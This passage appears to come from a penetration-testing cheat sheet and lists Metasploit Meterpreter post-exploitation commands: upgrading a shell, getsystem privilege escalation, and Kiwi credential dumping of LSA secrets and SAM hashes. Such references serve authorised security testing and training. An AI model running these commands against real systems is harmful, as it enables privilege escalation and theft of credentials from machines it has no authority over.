#### Upgrade Meterpreter shell
```
# 'java/meterpreter' shell does not work very well with all payloads
# so changing the shell to something else

use post/multi/manage/shell_to_meterpreter
```

Metasploit's Meterpreter built-in privilege escalation feature that attempts to gain SYSTEM-level privileges on the target machine. It works by trying a series of known techniques and exploits.
```
getsystem
```

### Kiwi Module
The Kiwi extension is a part of Metasploit's Meterpreter that provides various types of credential-oriented operations.
```
# attacker can perform passwords dumping and hashes, dumping passwords in memory, generating
# golden tickets
load kiwi

lsa_dump_secrets
lsa_dump_sam
```